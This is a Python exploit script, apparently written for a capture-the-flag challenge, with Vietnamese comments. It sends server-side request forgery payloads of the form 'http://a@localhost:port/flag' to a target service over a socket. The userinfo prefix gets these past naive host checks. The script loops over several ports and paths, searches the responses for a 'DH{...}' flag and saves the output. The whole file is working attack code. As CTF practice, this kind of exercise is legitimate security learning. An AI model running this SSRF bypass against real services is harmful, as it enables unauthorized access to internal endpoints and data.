import sys
import socket
import time
import re

# cấu hình thử nghiệm
COMMON_PORTS = [8000,20961]
COMMON_PATHS = [
    "/", "/flag", "/flag.txt"
]
SCHEMES = ["http", "https"]

# tìm flag theo regex phổ biến (tùy CTF)
FLAG_PATTERNS = [
    re.compile(r"DH\{.*?\}")
]

RECV_TIMEOUT = 2.0  # giây chờ sau khi gửi mỗi payload

def read_until_prompt(sock, timeout=RECV_TIMEOUT):
    """Đọc dữ liệu tới khi không còn hoặc timeout"""
    sock.setblocking(0)
    data = b""
    start = time.time()
    while True:
        if time.time() - start > timeout:
            break
        try:
            chunk = sock.recv(4096)
            if not chunk:
                # connection closed
                break
            data += chunk
            # nếu thấy prompt '>' ở cuối có thể dừng sớm
            if data.endswith(b'> ') or data.endswith(b'>\n') or b'result:' in data:
                # reset timer so we still collect the result after 'result: '
                start = time.time()
        except BlockingIOError:
            time.sleep(0.05)
    return data

def try_payload(target_host, target_port, payload):
    """Mở kết nối, gửi payload, đọc và trả về output (bytes)"""
    try:
        s = socket.create_connection((target_host, target_port), timeout=5)
    except Exception as e:
        return None, f"[connect error] {e}"

    try:
        # đọc initial banners / prompts
        banner = read_until_prompt(s, timeout=1.0)
        # gửi payload + newline
        s.sendall((payload + "\n").encode())
        # đọc phản hồi
        out = read_until_prompt(s, timeout=RECV_TIMEOUT)
        # đóng
        s.close()
        return out, None
    except Exception as e:
        try:
            s.close()
        except:
            pass
        return None, f"[comm error] {e}"

def find_flag_in_bytes(b):
    try:
        text = b.decode(errors="ignore")
    except:
        text = str(b)
    for p in FLAG_PATTERNS:
        m = p.search(text)
        if m:
            return m.group(0), text
    return None, text

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 exploit_read_flag.py <target_ip> [target_port]")
        sys.exit(1)
    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8000

    print(f"[+] Target: {target}:{port}")
    tried = 0
    found = False

    # build candidate list: các cổng x đường dẫn
    candidate_ports = COMMON_PORTS.copy()
    if port not in candidate_ports:
        candidate_ports.insert(0, port)

    for scheme in SCHEMES:
        for p in candidate_ports:
            for path in COMMON_PATHS:
                # payload dạng userinfo@host để bypass naive host checks
                # ví dụ: http://a@localhost:8080/flag
                host_to_try = "localhost"
                payload = f"{scheme}://a@{host_to_try}:{p}{path}"
                tried += 1
                print(f"[{tried}] Trying -> {payload}")
                out, err = try_payload(target, port, payload)
                if err:
                    print("   ", err)
                    continue
                if not out:
                    print("   no response")
                    continue
                # tìm flag trong output
                flag, full_text = find_flag_in_bytes(out)
                # in một số dòng đầu để kiểm tra
                snippet = full_text.strip().splitlines()[:12]
                for ln in snippet:
                    print("   >", ln)
                if flag:
                    print("\n*** FLAG FOUND! ***")
                    print(flag)
                    found = True
                    # lưu output ra file
                    with open("exploit_out.txt", "wb") as f:
                        f.write(out)
                    return
                # tránh gửi quá nhanh
                time.sleep(0.12)

    if not found:
        print("\n[-] Không thấy flag trong các thử nghiệm mặc định.")
        print("    Bạn có thể mở rộng COMMON_PORTS / COMMON_PATHS hoặc thử userinfo khác.")
        print("    Kết quả đầy đủ (nếu có) được lưu vào exploit_out.txt (nếu service trả dữ liệu).")

if __name__ == "__main__":
    main()
